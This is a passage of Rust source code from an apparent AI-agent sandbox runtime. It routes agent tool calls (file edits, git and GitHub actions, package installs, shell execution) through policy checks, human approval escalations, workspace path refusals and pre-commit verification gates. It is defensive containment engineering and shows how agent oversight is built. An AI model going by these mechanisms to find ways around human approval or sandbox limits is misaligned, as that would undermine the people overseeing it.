            pre_commit_diffs = Some(vec![diff_entry]);
            pre_commit_evidence_hash = Some(evidence_hash.clone());
            pre_export_plan = Some((
                canon_dst,
                bytes,
                mime_type,
                artifact_meta.sha256,
                artifact_meta.uri,
                evidence_hash,
                cas_blob_path.is_file().then_some(cas_blob_path),
            ));
        } else if tool_name == "workspace_switch" {
            if std::env::var_os("AOS_SESSION_ID").is_some() {
                bail!(
                    "workspace_switch is unavailable inside a single-root 'aegis-os run' kernel sandbox session; use 'fs_export_file' to export files to external directories or start a new session in the target directory."
                );
            }
            let raw_path = args
                .get("path")
                .and_then(|v| v.as_str())
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .context("Missing 'path'")?;

            let existing_binding =
                aos_core::session::resolve_session_workspace_binding(&self.runtime_data_root);
            let existing_umbrella = existing_binding.as_ref().and_then(|(_, u, _)| u.clone());

            let candidate = if Path::new(raw_path).is_absolute() {
                PathBuf::from(raw_path)
            } else if let Some(ref umb) = existing_umbrella {
                umb.join(raw_path)
            } else if let Some(parent) = env.workspace.host_source_root().parent() {
                parent.join(raw_path)
            } else {
                bail!(
                    "Relative workspace_switch path '{}' requires a parent or umbrella root",
                    raw_path
                );
            };
            let canon_target = std::fs::canonicalize(&candidate)
                .with_context(|| format!("Target workspace directory '{}' not found", candidate.display()))?;
            if !canon_target.is_dir() {
                bail!("Target workspace '{}' is not a directory", canon_target.display());
            }
            if canon_target == Path::new("/") {
                bail!("Refusing to switch workspace to '/'");
            }
            if let Some(home) = std::env::var_os("HOME")
                .map(PathBuf::from)
                .and_then(|h| std::fs::canonicalize(&h).ok())
            {
                if canon_target == home || home.starts_with(&canon_target) {
                    bail!(
                        "Refusing to switch workspace to '{}' (user home or ancestor)",
                        canon_target.display()
                    );
                }
            }
            let canon_rt = std::fs::canonicalize(&self.runtime_data_root)
                .unwrap_or_else(|_| self.runtime_data_root.clone());
            if canon_target.starts_with(&canon_rt) || canon_rt.starts_with(&canon_target) {
                bail!(
                    "Refusing to switch workspace to '{}' (overlaps Aegis runtime state)",
                    canon_target.display()
                );
            }
            let canon_s = canon_target.to_string_lossy();
            if is_forbidden_export_dest(&canon_s, &canon_s) {
                bail!(
                    "Refusing to switch workspace to protected directory '{}'",
                    canon_target.display()
                );
            }

            let within_umbrella = existing_umbrella
                .as_ref()
                .is_some_and(|u| canon_target.starts_with(u))
                || canon_target == env.workspace.host_source_root();
            let new_org_id = args
                .get("org_id")
                .and_then(|v| v.as_str())
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .map(str::to_string)
                .or_else(|| {
                    canon_target
                        .file_name()
                        .map(|n| n.to_string_lossy().to_string())
                })
                .unwrap_or_else(|| "default-org".to_string());

            target_resource = canon_target.display().to_string();
            if let Some(obj) = audit_metadata.as_object_mut() {
                obj.insert("within_umbrella".to_string(), json!(within_umbrella));
                obj.insert("target_org_id".to_string(), json!(new_org_id.clone()));
            }
            pre_switch_plan = Some((canon_target, new_org_id, existing_umbrella));
        } else if tool_name == "workspace_git" {
            let (plan, resource, diffs, meta) =
                self.prepare_workspace_git_plan(&env, identity, &args).await?;
            target_resource = resource;
            if let (Some(obj), Some(meta_obj)) =
                (audit_metadata.as_object_mut(), meta.as_object())
            {
                for (k, v) in meta_obj {
                    obj.insert(k.clone(), v.clone());
                }
            }
            pre_commit_diffs = Some(diffs);
            pre_commit_evidence_hash = Some(plan.evidence_hash.clone());
            pre_git_plan = Some(plan);
        } else if tool_name == "fs_import_file" {
            let (plan, resource, diffs, meta) =
                self.prepare_fs_import_file_plan(&env, identity, &args).await?;
            target_resource = resource;
            if let (Some(obj), Some(meta_obj)) =
                (audit_metadata.as_object_mut(), meta.as_object())
            {
                for (k, v) in meta_obj {
                    obj.insert(k.clone(), v.clone());
                }
            }
            pre_commit_diffs = Some(diffs);
            pre_commit_evidence_hash = Some(plan.evidence_hash.clone());
            pre_import_plan = Some(plan);
        } else if matches!(
            tool_name,
            "github_ci_inspect" | "github_pr_inspect" | "github_issue_inspect"
        ) {
            let (resource, meta) =
                Self::prepare_github_inspect_context(env.workspace.host_source_root(), &args)?;
            target_resource = resource;
            if let (Some(obj), Some(meta_obj)) =
                (audit_metadata.as_object_mut(), meta.as_object())
            {
                for (k, v) in meta_obj {
                    obj.insert(k.clone(), v.clone());
                }
            }
            if let Some(ev) = audit_metadata.get("evidence_hash").and_then(|v| v.as_str()) {
                pre_commit_evidence_hash = Some(ev.to_string());
            }
        } else if tool_name == "github_ci_rerun" {
            let (plan, resource, meta) =
                Self::prepare_github_ci_rerun_plan(env.workspace.host_source_root(), &args)?;
            target_resource = resource;
            if let (Some(obj), Some(meta_obj)) =
                (audit_metadata.as_object_mut(), meta.as_object())
            {
                for (k, v) in meta_obj {
                    obj.insert(k.clone(), v.clone());
                }
            }
            pre_commit_evidence_hash = Some(plan.evidence_hash.clone());
            pre_ci_rerun_plan = Some(plan);
        } else if tool_name == "github_pr_create" {
            let (plan, resource, diffs, meta) =
                Self::prepare_github_pr_create_plan(env.workspace.host_source_root(), &args)?;
            target_resource = resource;
            if let (Some(obj), Some(meta_obj)) =
                (audit_metadata.as_object_mut(), meta.as_object())
            {
                for (k, v) in meta_obj {
                    obj.insert(k.clone(), v.clone());
                }
            }
            pre_commit_diffs = Some(diffs);
            pre_commit_evidence_hash = Some(plan.evidence_hash.clone());
            pre_pr_create_plan = Some(plan);
        } else if tool_name == "github_comment_create" {
            let (plan, resource, diffs, meta) =
                Self::prepare_github_comment_create_plan(env.workspace.host_source_root(), &args)?;
            target_resource = resource;
            if let (Some(obj), Some(meta_obj)) =
                (audit_metadata.as_object_mut(), meta.as_object())
            {
                for (k, v) in meta_obj {
                    obj.insert(k.clone(), v.clone());
                }
            }
            pre_commit_diffs = Some(diffs);
            pre_commit_evidence_hash = Some(plan.evidence_hash.clone());
            pre_comment_create_plan = Some(plan);
        } else if tool_name == "github_pr_merge" {
            let (plan, resource, diffs, meta) =
                Self::prepare_github_pr_merge_plan(env.workspace.host_source_root(), &args)?;
            target_resource = resource;
            if let (Some(obj), Some(meta_obj)) =
                (audit_metadata.as_object_mut(), meta.as_object())
            {
                for (k, v) in meta_obj {
                    obj.insert(k.clone(), v.clone());
                }
            }
            pre_commit_diffs = Some(diffs);
            pre_commit_evidence_hash = Some(plan.evidence_hash.clone());
            pre_pr_merge_plan = Some(plan);
        } else if tool_name == "pkg_install" {
            let (plan, resource, diffs, meta) = Self::prepare_pkg_install_plan(&env, &args)?;
            target_resource = resource;
            if let (Some(obj), Some(meta_obj)) =
                (audit_metadata.as_object_mut(), meta.as_object())
            {
                for (k, v) in meta_obj {
                    obj.insert(k.clone(), v.clone());
                }
            }
            pre_commit_diffs = Some(diffs);
            pre_commit_evidence_hash = Some(plan.evidence_hash.clone());
            pre_pkg_install_plan = Some(plan);
        }
        let mut resolved_cross_org_peer: Option<(String, String)> = None;

        if matches!(tool_name, "ipc_send" | "ipc_request") {
            if let Some(raw_to) = args.get("to_agent").and_then(|v| v.as_str()) {
                let cleaned = raw_to.strip_prefix("agent:").unwrap_or(raw_to);
                let all_peers = self.ipc.list_all_peers().await.unwrap_or_default();
                let caller_is_workstation_peer = all_peers.iter().any(|p| {
                    p.org_id == identity.org_id
                        && p.agent_id == identity.agent_id
                        && p.pid.is_some()
                });
                let is_verified_workstation_pair = |org: &str, agent: &str| -> bool {
                    caller_is_workstation_peer
                        && all_peers
                            .iter()
                            .any(|p| p.org_id == org && p.agent_id == agent && p.pid.is_some())
                };
                if let Some((org_part, agent_part)) = cleaned.split_once('/') {
                    target_org = org_part.to_string();
                    resolved_cross_org_peer =
                        Some((org_part.to_string(), agent_part.to_string()));
                    if is_verified_workstation_pair(org_part, agent_part) {
                        if let Some(obj) = audit_metadata.as_object_mut() {
                            obj.insert("workstation_peer_verified".to_string(), json!(true));
                        }
                    }
                } else if args.get("target_org_id").is_none() {
                    // If not found in current org, auto-resolve unique peer ID from global peer list!
                    let same_org_peers = self
                        .ipc
                        .list_peers(&identity.org_id)
                        .await
                        .unwrap_or_default();
                    if !same_org_peers.iter().any(|p| p.agent_id == cleaned) {
                        let matches: Vec<_> = all_peers
                            .iter()
                            .filter(|p| p.online && p.agent_id == cleaned && p.pid.is_some())
                            .collect();
                        if caller_is_workstation_peer && matches.len() == 1 {
                            let matched = matches[0];
                            target_org = matched.org_id.clone();
                            resolved_cross_org_peer =
                                Some((matched.org_id.clone(), matched.agent_id.clone()));
                            if let Some(obj) = audit_metadata.as_object_mut() {
                                obj.insert("workstation_peer_verified".to_string(), json!(true));
                            }
                        }
                    }
                } else if args.get("scope").and_then(|v| v.as_str()) == Some("global")
                    && is_verified_workstation_pair(&target_org, cleaned)
                {
                    resolved_cross_org_peer =
                        Some((target_org.clone(), cleaned.to_string()));
                    if let Some(obj) = audit_metadata.as_object_mut() {
                        obj.insert("workstation_peer_verified".to_string(), json!(true));
                    }
                }
            }
        }

        if !matches!(
            tool_name,
            "policy_grant_lease" | "policy_approve_escalation" | "policy_list_escalations"
        ) {
            match self
                .authorize_and_audit(
                    identity,
                    tool_name,
                    &target_org,
                    &target_resource,
                    audit_metadata,
                )
                .await?
            {
                PolicyDecision::Allow { .. } => {}
                PolicyDecision::Ask {
                    escalation_id,
                    reason,
                    suggested_lease_scope,
                } => {
                    if matches!(
                        tool_name,
                        "workspace_commit"
                            | "fs_export_file"
                            | "fs_import_file"
                            | "workspace_git"
                            | "github_pr_create"
                            | "github_comment_create"
                            | "github_pr_merge"
                            | "pkg_install"
                    ) {
                        if let Some(ref diffs) = pre_commit_diffs {
                            let diff_dir = self.runtime_data_root.join("escalation_diffs");
                            let _ = tokio::fs::create_dir_all(&diff_dir).await;
                            let _ = aos_core::session::write_json_pretty_atomic(
                                &diff_dir.join(format!("{}.json", escalation_id)),
                                diffs,
                            )
                            .await;
                        }
                    }
                    let mut ask_payload = json!({
                        "status": "approval_required",
                        "escalation_id": escalation_id,
                        "reason": reason,
                        "suggested_lease_scope": suggested_lease_scope,
                        "evidence_hash": pre_commit_evidence_hash,
                        "hint": format!(
                            "Approve in the auto-opened Web Approval Console (/approve or /dashboard) where you can inspect the Unified Diff and click Approve Once (SHA-256 pinned) or Approve 1h, or in Cloud Mode provide your 6-digit Authenticator TOTP code in chat and pass `totp` on retry (escalation: {0}). Agents cannot self-approve without human action.",
                            escalation_id
                        )
                    });
                    if let Some((_, _, _, _, ref uri, _, _)) = pre_export_plan {
                        if let Some(obj) = ask_payload.as_object_mut() {
                            obj.insert("artifact_uri".to_string(), json!(uri));
                        }
                    }
                    return Ok(ask_payload);
                }
                PolicyDecision::Deny { reason } => {
                    bail!("Policy Denied syscall '{}': {}", tool_name, reason);
                }
            }
        }

        match tool_name {
            // ----------------------------------------------------------------
            // 1. Transactional CoW File System Tools (Zero-Prompt in Sandbox)
            // ----------------------------------------------------------------
            "fs_read" => {
                let rel_path = args
                    .get("path")
                    .and_then(|v| v.as_str())
                    .context("Missing 'path'")?;
                let encoding = args
                    .get("encoding")
                    .and_then(|v| v.as_str())
                    .unwrap_or("utf8");
                let (clean, full_path) = shadow_path_for_read(
                    env.workspace.shadow_root(),
                    env.workspace.host_source_root(),
                    rel_path,
                )?;
                let raw_bytes = tokio::fs::read(&full_path).await?;
                match encoding {
                    "base64" => Ok(json!({
                        "path": clean,
                        "encoding": "base64",
                        "size_bytes": raw_bytes.len(),
                        "content_base64": base64::engine::general_purpose::STANDARD.encode(&raw_bytes),
                        "workspace_mode": "cow_shadow"
                    })),
                    "utf8" => match String::from_utf8(raw_bytes) {
                        Ok(content) => Ok(json!({
                            "path": clean,
                            "content": content,
                            "workspace_mode": "cow_shadow"
                        })),
                        Err(e) => {
                            let size = e.into_bytes().len();
                            bail!(
                                "File '{}' is binary ({} bytes); inspect or process it with proc_exec, read small assets with encoding='base64', or export it via fs_export_file",
                                clean,
                                size
                            );
                        }
                    },
                    other => bail!(
                        "Unsupported fs_read encoding '{}'; expected 'utf8' or 'base64'",
                        other
                    ),
                }
            }

            "fs_write" => {
                let rel_path = args
                    .get("path")
                    .and_then(|v| v.as_str())
                    .context("Missing 'path'")?;
                let content = args
                    .get("content")
                    .and_then(|v| v.as_str())
                    .context("Missing 'content'")?;
                let encoding = args
                    .get("encoding")
                    .and_then(|v| v.as_str())
                    .unwrap_or("utf8");
                let raw_bytes = match encoding {
                    "utf8" => content.as_bytes().to_vec(),
                    "base64" => base64::engine::general_purpose::STANDARD
                        .decode(content.trim())
                        .context("Invalid base64 'content' in fs_write")?,
                    other => bail!(
                        "Unsupported fs_write encoding '{}'; expected 'utf8' or 'base64'",
                        other
                    ),
                };
                let byte_len = raw_bytes.len();
                let (clean, full_path) =
                    shadow_path_for_write(env.workspace.shadow_root(), rel_path)?;
                aos_core::session::write_bytes_atomic_synced_async(&full_path, raw_bytes).await?;
                Ok(json!({
                    "status": "written_to_cow_shadow",
                    "path": clean,
                    "bytes": byte_len,
                    "encoding": encoding,
                    "host_modified": false
                }))
            }

            "fs_export_file" => {
                let (canon_dst, bytes, mime_type, sha256, artifact_uri, evidence_hash, cas_blob) =
                    pre_export_plan.context("Missing pre-staged fs_export_file plan")?;
                let size_bytes = bytes.len();
                export_file_atomic_from_cas_or_bytes(cas_blob, bytes, canon_dst.clone()).await?;
                Ok(json!({
                    "status": "exported_to_host",
                    "dst_host_path": canon_dst,
                    "size_bytes": size_bytes,
                    "content_type": mime_type,
                    "sha256": sha256,
                    "artifact_uri": artifact_uri,
                    "evidence_hash": evidence_hash,
                }))
            }

            "fs_import_file" => {
                let plan = pre_import_plan.context("Missing pre-staged fs_import_file plan")?;
                let sym = std::fs::symlink_metadata(&plan.canon_src)
                    .with_context(|| format!("Host source '{}' disappeared", plan.canon_src.display()))?;
                if sym.file_type().is_symlink() || !sym.is_file() {
                    bail!(
                        "Refusing import: host source '{}' is no longer a regular file",
                        plan.canon_src.display()
                    );
                }
                let bytes = tokio::fs::read(&plan.canon_src).await?;
                let actual_sha = hex::encode(Sha256::digest(&bytes));
                if actual_sha != plan.src_sha256 {
                    bail!(
                        "TOCTOU integrity error: host source file '{}' changed after approval (expected sha256:{}, got sha256:{})",
                        plan.canon_src.display(),
                        plan.src_sha256,
                        actual_sha
                    );
                }
                if let Some(parent) = plan.dst_full_path.parent() {
                    tokio::fs::create_dir_all(parent).await?;
                }
                let byte_len = bytes.len();
                aos_core::session::write_bytes_atomic_synced_async(&plan.dst_full_path, bytes).await?;
                Ok(json!({
                    "status": "imported_from_host",
                    "src_host_path": plan.canon_src,
                    "import_to": plan.import_to,
                    "dst_path": plan.clean_dst_rel,
                    "dst_full_path": plan.dst_full_path,
                    "size_bytes": byte_len,
                    "sha256": plan.src_sha256,
                    "evidence_hash": plan.evidence_hash,
                }))
            }

            "workspace_switch" => {
                let (canon_target, new_org_id, existing_umbrella) =
                    pre_switch_plan.context("Missing pre-validated workspace_switch plan")?;
                let new_identity = AgentIdentity::new(
                    new_org_id,
                    identity.agent_id.clone(),
                    identity.role.clone(),
                );
                let new_env = self
                    .ensure_agent_environment(
                        new_identity.clone(),
                        &canon_target,
                        IsolationTier::NativeOsSandbox,
                        vec!["*".to_string()],
                    )
                    .await?;
                let _ = aos_core::session::bind_session_workspace(
                    &self.runtime_data_root,
                    "auto",
                    None,
                    &canon_target,
                    existing_umbrella.as_deref(),
                    true,
                );
                Ok(json!({
                    "status": "workspace_switched",
                    "org_id": new_identity.org_id,
                    "agent_id": new_identity.agent_id,
                    "host_source_root": canon_target,
                    "shadow_root": new_env.workspace.shadow_root(),
                }))
            }

            "fs_edit" => {
                let rel_path = args
                    .get("path")
                    .and_then(|v| v.as_str())
                    .context("Missing 'path'")?;
                let target = args
                    .get("target")
                    .and_then(|v| v.as_str())
                    .context("Missing 'target'")?;
                let replacement = args
                    .get("replacement")
                    .and_then(|v| v.as_str())
                    .context("Missing 'replacement'")?;
                let (clean, full_path) =
                    shadow_path_for_write(env.workspace.shadow_root(), rel_path)?;
                let original = tokio::fs::read_to_string(&full_path)
                    .await
                    .with_context(|| format!("File '{}' not found in CoW workspace", clean))?;
                if !original.contains(target) {
                    bail!(
                        "Target snippet not found in '{}' inside CoW shadow workspace",
                        clean
                    );
                }
                let updated = original.replace(target, replacement);
                aos_core::session::write_bytes_atomic_synced_async(
                    &full_path,
                    updated.into_bytes(),
                )
                .await?;
                Ok(json!({
                    "status": "edited_in_cow_shadow",
                    "path": clean,
                    "host_modified": false
                }))
            }

            "fs_delete" => {
                let rel_path = args
                    .get("path")
                    .and_then(|v| v.as_str())
                    .context("Missing 'path'")?;
                let (clean, full_path) =
                    shadow_path_for_write(env.workspace.shadow_root(), rel_path)?;
                if full_path.exists() {
                    tokio::fs::remove_file(&full_path).await?;
                }
                Ok(json!({
                    "status": "deleted_in_cow_shadow",
                    "path": clean,
                    "host_modified": false
                }))
            }

            "fs_glob" | "fs_list" => {
                let filter = args.get("pattern").and_then(|v| v.as_str()).unwrap_or("");
                let files = CoWWorkspace::collect_files(env.workspace.shadow_root()).await?;
                let matched: Vec<String> = files
                    .into_iter()
                    .map(|(rel, _)| rel)
                    .filter(|rel| filter.is_empty() || rel.contains(filter))
                    .collect();
                let diffs = env.workspace.diff(None).await?;
                Ok(json!({
                    "shadow_root": env.workspace.shadow_root(),
                    "files_count": matched.len(),
                    "files": matched,
                    "uncommitted_changes_count": diffs.len(),
                    "uncommitted_changes": diffs
                }))
            }

            "workspace_status" => {
                if !env.workspace.shadow_root().exists() {
                    let _ = self.ensure_org_vault(&identity.org_id).await;
                }
                let refresh = env.workspace.refresh_from_host().await?;
                let diffs = env.workspace.diff(None).await?;
                let snapshots = env.workspace.list_snapshots().await?;
                let unread_ipc = self
                    .ipc
                    .recv_inbox(&identity.org_id, &identity.agent_id, true, 50)
                    .await?;
                let escalations = self.policy.list_escalations(&identity.org_id).await?;
                let (claims, _) = self.load_claims(&identity.org_id).await.unwrap_or_default();
                let vault_status = self.vault.status_org(&identity.org_id).ok();
                let orphaned = self
                    .detect_orphaned_shadows(identity, env.workspace.host_source_root())
                    .await;
                Ok(json!({
                    "identity": identity,
                    "shadow_root": env.workspace.shadow_root(),
                    "host_source_root": env.workspace.host_source_root(),
                    "vault": vault_status,
                    "auto_refresh": refresh,
                    "uncommitted_changes_count": diffs.len(),
                    "uncommitted_changes": diffs,
                    "recoverable_orphaned_shadows": orphaned,
                    "active_claims": claims,
                    "snapshots": snapshots,
                    "unread_ipc_messages_count": unread_ipc.len(),
                    "pending_escalations": escalations
                }))
            }

            "workspace_sync" => {
                let orphan_recovery = if let Some(from_agent_id) = args
                    .get("adopt_orphaned_agent")
                    .and_then(|v| v.as_str())
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                {
                    Some(
                        self.recover_orphaned_agent_shadow(identity, from_agent_id)
                            .await?,
                    )
                } else {
                    None
                };
                let refresh = env.workspace.refresh_from_host().await?;
                let diffs = env.workspace.diff(None).await?;
                let (claims, _) = self.load_claims(&identity.org_id).await.unwrap_or_default();
                Ok(json!({
                    "status": if refresh.conflicts.is_empty() { "synced" } else { "conflicts_detected" },
                    "orphan_recovery": orphan_recovery,
                    "refresh_report": refresh,
                    "uncommitted_changes_count": diffs.len(),
                    "uncommitted_changes": diffs,
                    "active_claims": claims
                }))
            }

            "workspace_snapshot" => {
                let label = args
                    .get("label")
                    .and_then(|v| v.as_str())
                    .unwrap_or("manual-checkpoint");
                let snap = env.workspace.create_snapshot(label).await?;
                Ok(serde_json::to_value(snap)?)
            }

            "workspace_diff" => {
                let snap_id = args.get("snapshot_id").and_then(|v| v.as_str());
                let refresh = if snap_id.is_none() {
                    Some(env.workspace.refresh_from_host().await?)
                } else {
                    None
                };
                let diffs = env.workspace.diff(snap_id).await?;
                Ok(json!({
                    "base": snap_id.unwrap_or("host_source"),
                    "auto_refresh": refresh,
                    "changes": diffs
                }))
            }

            "workspace_rollback" => {
                let snap_id = args
                    .get("snapshot_id")
                    .and_then(|v| v.as_str())
                    .context("Missing 'snapshot_id'")?;
                env.workspace.rollback(snap_id).await?;
                Ok(json!({
                    "status": "rolled_back",
                    "snapshot_id": snap_id
                }))
            }

            "workspace_commit" => {
                let filter_paths: Option<Vec<String>> = args
                    .get("paths")
                    .and_then(|v| serde_json::from_value(v.clone()).ok());
                let overwrite_binaries = args
                    .get("overwrite_binaries")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false);
                let release_claims = args
                    .get("release_claims")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(true);
                let skip_verify = args
                    .get("skip_verify")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false);
                let host_verify_cfg: Option<serde_json::Value> = std::fs::read(
                    env.workspace.host_source_root().join(".aegis/verify.json"),
                )
                .ok()
                .and_then(|bytes| serde_json::from_slice(&bytes).ok());
                let verify_cmd = if skip_verify {
                    None
                } else {
                    args.get("verify_cmd")
                        .and_then(|v| v.as_str())
                        .map(|s| s.trim().to_string())
                        .filter(|s| !s.is_empty())
                        .or_else(|| {
                            std::env::var("AOS_VERIFY_CMD")
                                .ok()
                                .map(|s| s.trim().to_string())
                                .filter(|s| !s.is_empty())
                        })
                        .or_else(|| {
                            host_verify_cfg
                                .as_ref()
                                .and_then(|cfg| cfg.get("verify_cmd"))
                                .and_then(|v| v.as_str())
                                .map(|s| s.trim().to_string())
                                .filter(|s| !s.is_empty())
                        })
                };
                let verify_timeout_ms = args
                    .get("verify_timeout_ms")
                    .and_then(|v| v.as_u64())
                    .or_else(|| {
                        host_verify_cfg
                            .as_ref()
                            .and_then(|cfg| cfg.get("timeout_ms"))
                            .and_then(|v| v.as_u64())
                    })
                    .or(Some(30_000));
                let pre_verify_epoch = env.workspace.read_host_commit_epoch();
                // Refresh from host first so untouched peer-modified files (including binaries) fast-forward cleanly.
                let mut refresh = env.workspace.refresh_from_host().await?;
                // Coordination guard: refuse to land files that a live peer has claimed.
                let mut touched = env.workspace.changed_since_baseline().await?;
                if let Some(ref allow) = filter_paths {
                    touched.retain(|p| allow.contains(p));
                }
                if let Some(msg) = self.claim_conflict_for_paths(identity, &touched).await? {
                    bail!("{}", msg);
                }
                // Optional Pre-Commit Semantic Verification Gate: after `refresh_from_host` merges
                // disjoint peer changes into `shadow_root`, run `verify_cmd` inside the agent's OS
                // kernel sandbox before `commit_to_host_with_options` touches any host file.
                if refresh.conflicts.is_empty() {
                    if let Some(ref cmd) = verify_cmd {
                        let verify_out = env
                            .sandbox
                            .exec(ExecSpec {
                                command: "sh".to_string(),
                                args: vec!["-c".to_string(), cmd.clone()],
                                cwd: Some(env.workspace.shadow_root().to_path_buf()),
                                env: HashMap::new(),
                                timeout_ms: verify_timeout_ms,
                                background: false,
                            })
                            .await?;
                        if verify_out.exit_code != Some(0) {
                            let diag = if !verify_out.stderr.trim().is_empty() {
                                verify_out.stderr.trim()
                            } else {
                                verify_out.stdout.trim()
                            };
                            bail!(
                                "Pre-commit verification gate '{}' failed in shadow workspace (exit code {:?}; host repository untouched): {}",
                                cmd,
                                verify_out.exit_code,
                                diag
                            );
                        }
                    }
                }
                // Serialize host commits across processes and re-verify if another agent committed while
                // our pre-commit verification was running (Always-Green Trunk guarantee).
                let _host_commit_lock = env.workspace.acquire_host_commit_lock().await?;
                let mut epoch_reverified = false;
                if env.workspace.read_host_commit_epoch() != pre_verify_epoch {
                    let retry_refresh = env.workspace.refresh_from_host().await?;
                    if !retry_refresh.conflicts.is_empty() {
                        bail!(
                            "3-Way Merge Conflict detected against concurrent peer commit on {:?}: {:?}",
                            retry_refresh.conflicts,
                            retry_refresh.conflict_details
                        );
                    }
                    refresh.fast_forwarded.extend(retry_refresh.fast_forwarded);
                    refresh.merged.extend(retry_refresh.merged);
                    refresh.added_from_host.extend(retry_refresh.added_from_host);
                    refresh
                        .removed_from_host
                        .extend(retry_refresh.removed_from_host);
                    let mut retry_touched = env.workspace.changed_since_baseline().await?;
                    if let Some(ref allow) = filter_paths {
                        retry_touched.retain(|p| allow.contains(p));
                    }
                    if let Some(msg) = self
                        .claim_conflict_for_paths(identity, &retry_touched)
                        .await?
                    {
                        bail!("{}", msg);
                    }
                    if let Some(ref cmd) = verify_cmd {
                        let verify_out = env
                            .sandbox
                            .exec(ExecSpec {
                                command: "sh".to_string(),
                                args: vec!["-c".to_string(), cmd.clone()],
                                cwd: Some(env.workspace.shadow_root().to_path_buf()),
                                env: HashMap::new(),
                                timeout_ms: verify_timeout_ms,
                                background: false,
                            })
                            .await?;
                        if verify_out.exit_code != Some(0) {
                            let diag = if !verify_out.stderr.trim().is_empty() {
                                verify_out.stderr.trim()
                            } else {
                                verify_out.stdout.trim()
                            };
                            bail!(
                                "Pre-commit verification gate '{}' failed after concurrent peer commit rebase (exit code {:?}; host repository untouched): {}",
                                cmd,
                                verify_out.exit_code,
                                diag
                            );
                        }
                        epoch_reverified = true;
                    }
                }
                let committed = env
                    .workspace
                    .commit_to_host_with_options(filter_paths, overwrite_binaries)
                    .await?;
                drop(_host_commit_lock);

                let released_claims = if release_claims && !committed.is_empty() {
                    self.release_claims_matching_committed_paths(identity, &committed)
                        .await
                } else {
                    Vec::new()
                };
                let host_root = env.workspace.host_source_root();
                let mut committed_source_files = Vec::new();
                for rel in &committed {
                    let clean = rel.trim_start_matches('/').to_string();
                    let full = host_root.join(&clean);
                    if !full.exists() {
                        committed_source_files.push(paas::SourceFileEntry {
                            path: clean,
                            content: String::new(),
                            deleted: true,
                        });
                    } else if let Ok(raw) = tokio::fs::read(&full).await {
                        if !raw.iter().take(8000).any(|&b| b == 0) {
                            if let Ok(content) = String::from_utf8(raw) {
                                committed_source_files.push(paas::SourceFileEntry {
                                    path: clean,
                                    content,
                                    deleted: false,
                                });
                            }
                        }
                    }
                }
                let short_evidence = pre_commit_evidence_hash
                    .as_deref()
                    .map(|h| h.strip_prefix("sha256:").unwrap_or(h))
                    .map(|h| &h[..h.len().min(12)])
                    .unwrap_or("cow-3way");
                let git_trailer = format!(
                    "Aegis-OS-Verified: principal={}/{} files={} evidence=sha256:{} verify={}",
                    identity.org_id,
                    identity.agent_id,
                    committed.len(),
                    short_evidence,
                    if verify_cmd.is_some() { "passed" } else { "cow-3way" }
                );
                let pr_markdown_badge = format!(
                    "[![Verified by Aegis OS](https://img.shields.io/badge/Aegis_OS-CoW_Verified_%28{}_files%29-0A7D52)](https://github.com/heurion-org/aegis-os)\n\
                     > 🛡️ **Transactional Agent Commit (`{}/{}`)** · `{}` file(s) merged via 4-Tier CoW · Evidence: `sha256:{}` · [Run Agents Safely with Aegis OS](https://github.com/heurion-org/aegis-os)",
                    committed.len(),
                    identity.org_id,
                    identity.agent_id,
                    committed.len(),
                    short_evidence
                );
                Ok(json!({
                    "status": "committed_to_host",
                    "host_root": host_root,
                    "auto_refresh": refresh,
                    "verification_passed": verify_cmd.is_some(),
                    "epoch_reverified": epoch_reverified,
                    "committed_files": committed,
                    "released_claims": released_claims,
                    "committed_source_files": committed_source_files,
                    "audit_receipt": {
                        "evidence_hash": pre_commit_evidence_hash,
                        "git_trailer": git_trailer,
                        "pr_markdown_badge": pr_markdown_badge,
                    }
                }))
            }

            "workspace_export_pr" => {
                let branch_name = args
                    .get("branch_name")
                    .and_then(|v| v.as_str())
                    .unwrap_or("");
                let commit_title = args
                    .get("commit_title")
                    .and_then(|v| v.as_str())
                    .unwrap_or("");
                let workspace_id = args.get("workspace_id").and_then(|v| v.as_str());
                let overwrite_binaries = args
                    .get("overwrite_binaries")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false);
                self.paas
                    .export_workspace_pr(
                        self,
                        identity,
                        workspace_id,
                        branch_name,
                        commit_title,
                        overwrite_binaries,
                    )
                    .await
            }

            "workspace_git_inspect" => execute_workspace_git_inspect(&env, &args).await,

            "workspace_git" => {
                let plan = pre_git_plan.context("Missing pre-validated workspace_git plan")?;
                execute_workspace_git_plan(self, &env, plan, identity).await
            }

            "github_ci_inspect" => {
                execute_github_ci_inspect(env.workspace.host_source_root(), &args).await
            }

            "github_ci_rerun" => {
                let plan = pre_ci_rerun_plan.context("Missing pre-validated github_ci_rerun plan")?;
                execute_github_ci_rerun(plan).await
            }

            "github_pr_inspect" => {
                execute_github_pr_inspect(env.workspace.host_source_root(), &args).await
            }

            "github_issue_inspect" => {
                execute_github_issue_inspect(env.workspace.host_source_root(), &args).await
            }

            "github_pr_create" => {
                let plan = pre_pr_create_plan.context("Missing pre-validated github_pr_create plan")?;
                execute_github_pr_create(plan).await
            }

            "github_comment_create" => {
                let plan = pre_comment_create_plan
                    .context("Missing pre-validated github_comment_create plan")?;
                execute_github_comment_create(plan).await
            }

            "github_pr_merge" => {
                let plan = pre_pr_merge_plan
                    .context("Missing pre-validated github_pr_merge plan")?;
                execute_github_pr_merge(plan).await
            }

            "pkg_install" => {
                let plan = pre_pkg_install_plan.context("Missing pre-validated pkg_install plan")?;
                execute_pkg_install(identity, plan).await
            }

            // ----------------------------------------------------------------
            // 2. Sandboxed Command Execution Tools (Zero-Prompt in Sandbox)
            // ----------------------------------------------------------------
            "proc_exec" => {
                if let Some(poll_pid) = args.get("poll_pid").and_then(|v| v.as_u64()) {
                    let pid = poll_pid as u32;
                    let bg_dir = env.sandbox.config().agent_home_dir.join("bg_jobs");
                    let out_path = bg_dir.join(format!("{}.stdout.log", pid));
                    let err_path = bg_dir.join(format!("{}.stderr.log", pid));
                    let exit_path = bg_dir.join(format!("{}.exit", pid));
                    let stdout = tokio::fs::read_to_string(&out_path).await.unwrap_or_default();
                    let stderr = tokio::fs::read_to_string(&err_path).await.unwrap_or_default();
                    let recorded_exit = tokio::fs::read_to_string(&exit_path)
                        .await
                        .ok()
                        .and_then(|s| s.trim().parse::<i32>().ok());
                    #[cfg(unix)]
                    let running = recorded_exit.is_none() && {
